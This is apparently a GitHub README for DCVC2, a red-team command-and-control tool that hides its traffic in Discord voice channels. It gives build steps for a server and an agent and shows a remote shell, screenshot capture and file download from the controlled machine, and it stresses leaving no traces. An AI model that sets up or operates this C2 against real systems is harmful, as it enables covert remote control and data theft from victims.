# Discord Voice Channel C2 aka DCVC2
<p align="center">
  <img src="https://user-images.githubusercontent.com/34954477/234471867-71268973-ca35-472c-aca6-bc4142d04ed5.png">
</p>

This multi operating system compatible tool was created to leverage Discord's voice channels for command and control operations. This tool operates entirely over the Real-Time Protocol (RTP) primarily leveraging <a href ="https://stealthbits.com/stealthaudit-for-active-directory-product/(https://github.com/bwmarrin/discordgo)">DiscordGo</a> and leaves no pesky traces behind in text channels. It is a command line based tool meaning all operations will occur strictly from the terminal on either Windows/Linux/OSX. Please use responsibly but have fun! ;)

## Requirements:
1. Updated (wrong link before) <a href ="https://www.3nailsinfosec.com/post/using-discord-s-voice-channel-for-c2-operations">Read about DCVC2</a>
2. You need a Discord account.
3. You need a Discord server.
4. Increase voice chat speed to 96kbps in settings.
5. You need 2 Discord bots. I found it easiest to give both bots admin perms over the discord server but you can fine tune them to only need voice permissions. The best guide to create bots is <a href ="https://discordpy.readthedocs.io/en/stable/discord.html">here</a>.

## Build:
```
git clone https://github.com/3NailsInfoSec/DCVC2.git
cd DCVC2
go mod download
go build server.go
go build agent.go
```
## Usage: 
When you execute the server and agent you should see both join the voice channel you specify:

![image](https://user-images.githubusercontent.com/34954477/234415119-662ecfb1-b38e-4a58-839b-3718f9017333.png)

Shell commands:
```
cmd> whoami

desktop-3kjj3kj\sm00v
```
I added 2 hardcoded additions besides basic shell usage:
```
cmd> screenshot
screenshotting..............................................

&

cmd> download
download file path>C:\Users\sm00v\Downloads\34954477.jpg
............................................................
```
## Credits
<a href ="https://twitter.com/5m00v">Twitter: @sm00v</a>

<a href ="https://github.com/5m00v">Github: @sm00v</a>
